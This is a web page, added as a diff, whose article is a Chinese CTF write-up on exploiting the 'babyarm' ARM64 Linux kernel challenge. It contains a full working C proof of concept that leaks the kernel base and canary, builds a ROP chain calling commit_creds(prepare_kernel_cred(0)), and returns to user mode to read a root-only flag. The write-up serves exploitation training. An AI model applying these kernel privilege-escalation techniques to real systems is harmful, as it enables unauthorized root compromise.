@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://nekoboxnode.github.io/news/article-46432.htm" />
+    <meta charset="utf-8">
+    <title>CTF babyarm内核题目分析</title>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+        <meta name="description" content="本文从漏洞分析、ARM64架构漏洞利用方式来讨论如何构造提权PoC达到读取root权限的文件。此题是一个ARM64架构的Linux 5.17.2 版本内核提权题目，目的是读取root用户的flag文件" />
+    
+    <!-- Favicon -->
+    <link href="/assets/website/img/nekoboxnode/favicon.ico" rel="icon">
+
+    <meta name="author" content="NekoBoxNode官网节点站">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://nekoboxnode.github.io/news/article-46432.htm" />
+    <meta property="og:site_name" content="NekoBoxNode官网节点站" />
+    <meta property="og:title" content="CTF babyarm内核题目分析" />
+    <meta property="og:image" content="https://nekoboxnode.github.io/uploads/20240427/974ca3db3e9d2b54a2a35c0eefff85ed.webp" />
+        <meta property="og:release_date" content="2025-01-26T09:59:21" />
+    <meta property="og:updated_time" content="2025-01-26T09:59:21" />
+        <meta property="og:description" content="本文从漏洞分析、ARM64架构漏洞利用方式来讨论如何构造提权PoC达到读取root权限的文件。此题是一个ARM64架构的Linux 5.17.2 版本内核提权题目，目的是读取root用户的flag文件" />
+    
+    <meta name="applicable-device" content="pc,mobile" />
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta name="robots" content="max-image-preview:large" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="CTF babyarm内核题目分析">
+    <meta name="format-detection" content="telephone=no">
+
+    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://www.googleadservices.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
+        
+    <!-- Google Web Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Ubuntu:wght@500;700&display=swap"
+        rel="stylesheet">
+
+    <!-- Icon Font Stylesheet -->
+    <link href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.bootcdn.net/ajax/libs/bootstrap-icons/1.4.1/font/bootstrap-icons.css" rel="stylesheet">
+
+    <!-- Libraries Stylesheet -->
+    <link href="/assets/website/js/frontend/nekoboxnode/lib/animate/animate.min.css" rel="stylesheet">
+    <link href="/assets/website/js/frontend/nekoboxnode/lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
+
+    <!-- Customized Bootstrap Stylesheet -->
+    <link href="/assets/website/css/nekoboxnode/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Template Stylesheet -->
+    <link href="/assets/website/css/nekoboxnode/style.css" rel="stylesheet">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-93Z2TV5VL1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-93Z2TV5VL1');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+    <!-- Spinner Start -->
+    <div id="spinner"
+        class="show bg-white position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
+        <div class="spinner-grow text-primary" style="width: 3rem; height: 3rem;" role="status">
+            <span class="sr-only">Loading...</span>
+        </div>
+    </div>
+    <!-- Spinner End -->
+
+
+        <!-- Navbar Start -->
+    <div class="container-fluid sticky-top">
+        <div class="container">
+            <nav class="navbar navbar-expand-lg navbar-dark p-0">
+                                <a href="/" class="navbar-brand text-white">NekoBox Node</a>
+                                <button type="button" class="navbar-toggler ms-auto me-0" data-bs-toggle="collapse"
+                    data-bs-target="#navbarCollapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarCollapse">
+                    <div class="navbar-nav ms-auto">
+                                                <a href="/" class="nav-item nav-link">首页</a>
+                                                <a href="/free-nodes/" class="nav-item nav-link">免费节点</a>
+                                                <a href="/paid-subscribe/" class="nav-item nav-link">推荐机场</a>
+                                                <a href="/news/" class="nav-item nav-link">新闻资讯</a>
+                                                <a href="#" class="nav-item nav-link">关于</a>
+                        <a href="#" class="nav-item nav-link">联系</a>
+                    </div>
+                </div>
+            </nav>
+        </div>
+    </div>
+    <!-- Navbar End -->
+
+
+    <!-- Hero Start -->
+    <div class="container-fluid pt-5 bg-primary hero-header">
+        <div class="container pt-5">
+            <div class="row g-5 pt-5">
+                <div class="col-lg-6 align-self-center text-center text-lg-start mb-lg-5">
+                    <h1 class="text-white mb-4 animated slideInRight">CTF babyarm内核题目分析</h1>
+                    <nav aria-label="breadcrumb">
+                        <ol class="breadcrumb justify-content-center justify-content-lg-start mb-0">
+                            <li class="breadcrumb-item"><a class="text-white" href="/" title="首页">首页</a></li>
+                            <li class="breadcrumb-item"><a class="text-white" href="/news/" title="新闻资讯">新闻资讯</a></li>
+                            <li class="breadcrumb-item text-white active" aria-current="page">正文</li>
+                        </ol>
+                    </nav>
+                </div>
+                <div class="col-lg-6 align-self-end text-center text-lg-end">
+                    <img class="img-fluid" href="/assets/website/img/nekoboxnode/hero-img.png" alt="" style="max-height: 300px;">
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Hero End -->
+
+
+    <!-- Full Screen Search Start -->
+    <div class="modal fade" id="searchModal" tabindex="-1">
+        <div class="modal-dialog modal-fullscreen">
+            <div class="modal-content" style="background: rgba(20, 24, 62, 0.7);">
+                <div class="modal-header border-0">
+                    <button type="button" class="btn btn-square bg-white btn-close" data-bs-dismiss="modal"
+                        aria-label="Close"></button>
+                </div>
+                <div class="modal-body d-flex align-items-center justify-content-center">
+                    <div class="input-group" style="max-width: 600px;">
+                        <input type="text" class="form-control bg-transparent border-light p-3"
+                            placeholder="Type search keyword">
+                        <button class="btn btn-light px-4"><i class="bi bi-search"></i></button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Full Screen Search End -->
+
+
+    <!-- About Start -->
+    <div class="container-fluid py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-9">
+                                    <input type="hidden" id="share-website-info" data-name="" data-url="">
+                  				  				  				<p>本文从漏洞分析、ARM64架构漏洞利用方式来讨论如何构造提权PoC达到读取root权限的文件。此题是一个ARM64架构的Linux 5.17.2 版本内核提权题目，目的是读取root用户的flag文件。</p> </h1> <p>题目默认开启了KASLR地址随机化和PXN防护，指定CPU核心数量为一，线程为一。</p> <p>使用<code>cpio</code>命令分离出驱动模块后放到IDA查看，只实现了<code>read</code>和<code>write</code>函数的功能，功能相当简单。<code>read</code>函数把内核栈内容拷贝到全局变量<code>demo_buf</code>，然后再把<code>demo_buf</code>的内容拷贝到用户态缓冲区，长度不超过0x1000。其他不重要的信息可以不用看：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/48e320f90b7bef07779c3e67e02c2eac.jpg" alt="CTF babyarm内核题目分析"></p> <p><code>write</code>函数把用户态缓冲区内容拷贝到<code>demo_buf</code>，然后将<code>demo_buf</code>内容拷贝到内核栈中，同样长度不超过0x1000：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/51ba2ef404c4941111f96abace81004d.jpg" alt="CTF babyarm内核题目分析"></p> </h1> <p>知道模块的基本功能之后，现在来考虑利用方式。</p> <ul> <li>首先，题目启动脚本中没有给定<code>nokaslr</code>，默认开启地址随机化，需要泄露内核地址，当然还有canary。并且ARM架构下默认开启了PXN，内核无法直接执行用户态代码，需要使用ROP技术。</li> <li>上一步泄露完成之后，可以获得kernel中的gadget地址，以此来构造ROP，执行<code>commit_creds(prepare_kernel_cred(0))</code>提升进程权限，返回用户态，并<code>fork</code>一个新的shell，就可以继承父进程的权限完成提权</li> </ul> </h1> <p>第一步的泄露很简单，直接使用<code>read</code>函数功能就可以达到目的，代码如下：</p> <pre><code class="language-c">int fd = open("/proc/demo",2);  size_t leak[0x200] = {0}; read(fd, leak, 0x1f8); for (int i = 0; i &lt; 100; i++) { 	printf("id %d : 0x%llx\n",i,leak[i]); }</code></pre> <p>这里编译的时候需要使用交叉编译为ARM64的程序。交叉编译环境的安装方式很简单：</p> <pre><code class="language-bash">sudo apt-get install emdebian-archive-keyring sudo apt-get install linux-libc-dev-arm64-cross libc6-arm64-cross sudo apt-get install binutils-aarch64-linux-gnu gcc-8-aarch64-linux-gnu sudo apt-get install g++-8-aarch64-linux-gnu</code></pre> <p>编译exp:</p> <pre><code class="language-bash">aarch64-linux-gnu-gcc-8 -static exp.c -o exp</code></pre> <p>重新打包后运行exp，根据泄露的结果得知第3个值是内核代码地址，第13个值是canary</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/9c77472212b0935bac624a0cd0dd49b7.jpg" alt="CTF babyarm内核题目分析"></p> <p>用ARM64的基础加载地址 0xffff800008000000 算出内核基址、<code>commit_creds</code>和<code>prepare_kernel_cred</code>的地址：</p> <pre><code class="language-c">size_t commit_creds, prepare_kernel_cred = 0; size_t kernel_base,offset = 0;  size_t kernel_addr = leak[2]; size_t canary = leak[12];  offset = kernel_addr - 0xffff8000082376f8; kernel_base = 0xffff800008000000 + offset;  commit_creds = kernel_base + 0xa2258; prepare_kernel_cred = kernel_base + 0xa24f8;</code></pre> <p>接下来要考虑如何构造ROP链，如何返回用户态。</p> <p>这里先了解一下ARM64汇编指令和x86_64指令的区别：</p> <ul> <li>x86_64指令六个参数为RDI、RSI、RDX、RCX、R8、R9，函数结束时使用<code>LEAVE</code>和<code>RET</code>平衡栈，返回值放在RAX寄存器中，<code>RET</code>指令会使RSP+8</li> <li>ARM64有X0～X30这些寄存器，参数一为X0寄存器，返回值同样使用X0寄存器，栈指针为SP寄存器，PC寄存器存储当前指令，使用<code>LDP X29, X30, [SP]</code> 这种方式给X29和X30寄存器赋值，当<code>RET</code>指令时将X30寄存器值给PC寄存器，但<code>RET</code>指令不会使SP+8，也就是说ARM64不会像X86那样频繁移动栈顶</li> </ul> <p>根据以上结论，我们需要控制ARM64的执行流，就需要控制X30寄存器，并给参数寄存器X0赋值。而现在内核栈是我们可控的，那么理论上就可以控制PC指针。</p> <p>首先调用<code>prepare_kernel_cred(0)</code>，参数为0，需要将X0赋值为0，ROPgadget工具不是很好用，直接手动找，在内核文件中找到如下gadget：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/3aa2f1d7a3741f21a80bf43d70765ca8.jpg" alt="CTF babyarm内核题目分析"></p> <p>这一部分控制了很多寄存器，可以极大的方便我们后续操作。通过调试偏移写出payload如下：</p> <pre><code class="language-c">	size_t gadget2 = kernel_base + 0x16950;  	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred;</code></pre> <p>调试的时候发现一个问题，因为ARM64的<code>RET</code>指令并不会使用栈中的数据作为返回地址，而是使用X30寄存器的值，在<code>prepare_kernel_cred</code>函数结束后，由于X30寄存器还是之前的值，又再次执行了<code>prepare_kernel_cred</code>，这显然不是想要的结果。这里先看看ARM程序是怎么开辟栈帧的：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/51a4403b698668a9deab1c1827f003ba.jpg" alt="CTF babyarm内核题目分析"></p> <p>这是在内核中随便找的函数，不用考虑这个函数做了什么，重点关注第一条指令和最后两条指令，第一条指令将X29和X30寄存器放入到栈中，最后两条指令平衡栈。如果去掉第一条指令，那么在平衡栈的时候就会将我们构造的内容给X29和X30。这里也看到ARM不像x86那样可以通过加减地址来获得不同的指令，ARM指令必须以四字节对齐为一个指令。所以在执行<code>prepare_kernel_cred</code>时应该地址加上四字节，执行<code>commit_creds</code>函数也是同理。调试修改上面的payload为如下：</p> <pre><code class="language-c">	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[19] = 0; 	leak[20] = 0; 	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred + 4; 	leak[32] = commit_creds + 4; 	leak[36] = gadget2;  	leak[37] = 0x7777777777777777; 	leak[38] = canary; 	leak[39] = 0x2222222222222222; 	leak[40] = 0x3333333333333333;</code></pre> <p>执行完<code>commit_creds(prepare_kernel_cred(0))</code>后，当前exp进程的<code>cred</code>结构体已经是root，但内核栈已经被我们破坏掉了，继续执行会导致内核崩溃重启，此时需要手动返回用户态起shell。</p> <p>需要知道的是ARM64使用<code>SVC</code>指令进入内核态，使用<code>ERET</code>指令返回用户态，同x86一样，ARM在进入内核态之前会保存用户态所有寄存器状态，在返回时恢复。其中比较重要的寄存器有SP_EL0、ELR_EL1、SPSR_EL1，它们保存内容分别如下：</p> <ul> <li>SP_EL0保存用户态的栈指针</li> <li>ELR_EL1保存要返回的用户态PC指针</li> <li>SPSR_EL1保存一个值，暂不知道是何用处，但他的值是固定的0x80001000</li> </ul> <p>我们手动恢复这几个寄存器，然后在调用ERET时就可以返回用户态执行函数了。而要找到恢复这些寄存器的gadget可以直接在调试器中单步跟随，找到内核何时返回用户态，然后直接使用这些gadget就行。内容如下：</p> <pre><code class="language-c">   0xffff800008011fe4:	msr	sp_el0, x23    0xffff800008011fe8:	tst	x22, #0x10    0xffff800008011fec:	b.eq	0xffff800008011ff4  // b.none    0xffff800008011ff0:	nop    0xffff800008011ff4:	ldr	x0, [x28, #3432]    0xffff800008011ff8:	b	0xffff800008012024     0xffff800008012024:	msr	elr_el1, x21    0xffff800008012028:	msr	spsr_el1, x22    0xffff80000801202c:	ldp	x0, x1, [sp]    0xffff800008012030:	ldp	x2, x3, [sp, #16]    0xffff800008012034:	ldp	x4, x5, [sp, #32]    0xffff800008012038:	ldp	x6, x7, [sp, #48]    0xffff80000801203c:	ldp	x8, x9, [sp, #64]    0xffff800008012040:	ldp	x10, x11, [sp, #80]    0xffff800008012044:	ldp	x12, x13, [sp, #96]    0xffff800008012048:	ldp	x14, x15, [sp, #112]    0xffff80000801204c:	ldp	x16, x17, [sp, #128]    0xffff800008012050:	ldp	x18, x19, [sp, #144]    0xffff800008012054:	ldp	x20, x21, [sp, #160]    0xffff800008012058:	ldp	x22, x23, [sp, #176]    0xffff80000801205c:	ldp	x24, x25, [sp, #192]    0xffff800008012060:	ldp	x26, x27, [sp, #208]    0xffff800008012064:	ldp	x28, x29, [sp, #224]    0xffff800008012068:	nop    0xffff80000801206c:	nop    0xffff800008012070:	nop</code></pre> <p>观察这两段gadget，这些寄存器我们都可以控制，这就比较简单了，直接拿过来用就可以了，并且在执行完这段gadget后，会自动执行<code>ERET</code>指令，其实这段函数就是内核返回用户态的代码。指定上面三个关键寄存器的值，用户态栈地址可以随意指定一个，内核只做地址校验，并不会触发panic，ELR_EL1构造为用户态代码地址，最后修改payload如下：</p> <pre><code class="language-c">	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[19] = 0; 	leak[20] = 0; 	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred + 4; 	leak[32] = commit_creds + 4; 	leak[33] = 0x1111111111111111;  	leak[36] = gadget2;  	leak[37] = 0x7777777777777777; 	leak[38] = canary; 	leak[39] = 0x2222222222222222; 	leak[40] = 0x3333333333333333; 	leak[41] = (size_t)leak;          // x29  far_el1=0x00ffffc150b790  	leak[42] = kernel_base + 0x11fe4; // x30  	leak[43] = 0x6666666666666666;    // x19 	leak[44] = 0x7777777777777777;    // x20 	leak[45] = (size_t)shell;         // x21   elr_el1=0x41f518 	leak[46] = 0x80001000;            // x22   spsr_el1=0x80001000 	leak[47] = (size_t)leak;          // x23   sp_el0=0x00ffffc150b790 	leak[48] = 0x2222222222222222;    // x24 	leak[49] = 0x3333333333333333;    // x25 	leak[51] = 0x4444444444444444;</code></pre> <p>完整PoC如下，最后执行<code>system("/bin/sh")</code>时，在<code>clone</code>系统调用时会失败，原因可能是因为某个ARM寄存器未还原，触发了缺页机制，会分配一个新的页，最后PC指针指向这个非法地址，无法获取shell，所以改成了ORW的方式读取flag：</p> <pre><code class="language-c">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;linux/types.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/wait.h&gt;  size_t commit_creds, prepare_kernel_cred = 0; // 0xffff8000080a2258 0xffff8000080a24f8 size_t kernel_base,offset = 0; // 0xffff800008000000 size_t gadget2 = 0;  void shell(void) { 	// int uid = getuid(); 	// printf("uid == %d\n",uid); 	// system("/bin/sh"); 	char buf[0x40] = {0}; 	int fd = open("/flag",0); 	read(fd, buf, 0x40); 	write(1, buf, 0x40); }  int main() { 	int fd = open("/proc/demo",2); 	if (fd &lt; 0) 	{ 		puts("open error"); 		exit(-1); 	}  	size_t leak[0x200] = {0};  	read(fd, leak, 0x1f8); 	for (int i = 0; i &lt; 36; i++) 	{ 		printf("id %d : 0x%llx\n",i,leak[i]); 	} 	size_t kernel_addr = leak[2]; 	size_t canary = leak[12]; 	printf("kerenl_addr== 0x%llx , canary == 0x%llx\n",kernel_addr,canary);  	offset = kernel_addr - 0xffff8000082376f8;  	kernel_base = 0xffff800008000000 + offset; //ffffd587d10a2258 0xffffd587d10a2258, 	commit_creds = kernel_base + 0xa2258; 	prepare_kernel_cred = kernel_base + 0xa24f8; 	gadget2 = kernel_base + 0x16950;  	printf("kerenl_base== 0x%llx ,commit_creds == 0x%llx, prepare_kernel_cred == 0x%llx\n",kernel_base,commit_creds,prepare_kernel_cred); 	printf("%p\n",leak);  	leak[13] = 0x4141414141414141; 	leak[14] = 0x4141414141414141; 	leak[16] = canary; 	leak[18] = gadget2;  	leak[19] = 0; 	leak[20] = 0; 	leak[21] = 0x8888888888888888; 	leak[22] = prepare_kernel_cred + 4; 	leak[32] = commit_creds + 4; 	leak[33] = 0x1111111111111111; 	leak[36] = gadget2;  	leak[37] = 0x7777777777777777; 	leak[38] = canary; 	leak[39] = 0x2222222222222222; 	leak[40] = 0x3333333333333333; 	leak[41] = (size_t)leak;          // x29  far_el1=0x00ffffc150b790 	leak[42] = kernel_base + 0x11fe4; // x30 	leak[43] = 0x6666666666666666;    // x19 	leak[44] = 0x7777777777777777;    // x20 	leak[45] = (size_t)shell;         // x21   elr_el1=0x41f518 	leak[46] = 0x80001000;            // x22   spsr_el1=0x80001000 	leak[47] = (size_t)leak;          // x23   sp_el0=0x00ffffc150b790 	leak[48] = 0x2222222222222222;    // x24 	leak[49] = 0x3333333333333333;    // x25 	leak[51] = 0x4444444444444444;  	 	write(fd, leak, 0x200); 	close(fd);  	return 0; };</code></pre> <p>完成读取root权限的文件flag：<br /><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/0bd4cf07b86facf2feef5ed3137605b4.jpg" alt="CTF babyarm内核题目分析"></p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-45937.htm">聊城宠物吧（聊城宠物店电话）</a></p>
+                                        <p>下一个：<a href="/news/article-46433.htm">宠物粮食加工厂什么岗位比较好呢 宠物粮食加工厂什么岗位比较好呢工资多少</a></p>
+                                    </div>
+                                </div>
+                <div class="col-md-3">
+                    <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/news/article-28440.htm" title="办理动物诊疗许可证需要什么材料洛阳（动物诊疗许可证需要多少钱）">办理动物诊疗许可证需要什么材料洛阳（动物诊疗许可证需要多少钱）</a></li>
+                        <li class="py-2"><a href="/news/article-37018.htm" title="领养孩子评估回访（收养回访工作实施方案）">领养孩子评估回访（收养回访工作实施方案）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-12-26-clash-node-daily-updates.htm" title="「12月26日」最高速度18.7M/S，2024年NekoBox每天更新免费节点订阅链接">「12月26日」最高速度18.7M/S，2024年NekoBox每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-30323.htm" title="猫三联是一针针对一个病毒吗（猫三联是一针针对一个病毒吗还是两针）">猫三联是一针针对一个病毒吗（猫三联是一针针对一个病毒吗还是两针）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-1-16-free-ssr-node.htm" title="「1月16日」最高速度19.5M/S，2025年NekoBox每天更新免费节点订阅链接">「1月16日」最高速度19.5M/S，2025年NekoBox每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-2-node-share.htm" title="「11月2日」最高速度22.3M/S，2024年NekoBox每天更新免费节点订阅链接">「11月2日」最高速度22.3M/S，2024年NekoBox每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-13-clash-windows.htm" title="「11月13日」最高速度23M/S，2024年NekoBox每天更新免费节点订阅链接">「11月13日」最高速度23M/S，2024年NekoBox每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-38493.htm" title="SpringCloud——安全认证（Security）">SpringCloud——安全认证（Security）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-12-11-free-node-subscribe.htm" title="「12月11日」最高速度20.7M/S，2024年NekoBox每天更新免费节点订阅链接">「12月11日」最高速度20.7M/S，2024年NekoBox每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-26583.htm" title="附近哪里有狗狗宠物店收狗（附近哪里有狗狗宠物店收狗狗的）">附近哪里有狗狗宠物店收狗（附近哪里有狗狗宠物店收狗狗的）</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">78</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">93</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">34</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">25</span> <a href="/date/2024-10/" title="2024-10 归档">2024-10</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- About End -->
+
+
+
+        <!-- Footer Start -->
+    <div class="container-fluid bg-dark text-white-50 footer pt-5">
+        <div class="container wow fadeIn" data-wow-delay="0.1s">
+            <div class="copyright">
+                <div class="row">
+                    <div class="col-md-6 text-center text-md-start mb-3 mb-md-0">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                        NekoBoxNode官网节点站 版权所有
+                        <br />
+                        Powered by WordPress
+                    </div>
+                    <div class="col-md-6 text-center text-md-end">
+                        <div class="footer-menu">
+                            <a href="/">Home</a>
+                            <a href="#">Cookies</a>
+                            <a href="#">Help</a>
+                            <a href="#">FAQs</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Footer End -->
+
+
+    <!-- Back to Top -->
+    <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top pt-2"><i class="bi bi-arrow-up"></i></a>
+
+
+    <!-- JavaScript Libraries -->
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.0.0/js/bootstrap.bundle.min.js"></script>
+    <script src="/assets/website/js/frontend/nekoboxnode/lib/wow/wow.min.js"></script>
+    <script src="/assets/website/js/frontend/nekoboxnode/lib/easing/easing.min.js"></script>
+    <script src="/assets/website/js/frontend/nekoboxnode/lib/waypoints/waypoints.min.js"></script>
+    <script src="/assets/website/js/frontend/nekoboxnode/lib/counterup/counterup.min.js"></script>
+    <script src="/assets/website/js/frontend/nekoboxnode/lib/owlcarousel/owl.carousel.min.js"></script>
+
+    <!-- Template Javascript -->
+    <script src="/assets/website/js/frontend/nekoboxnode/main.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script><script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
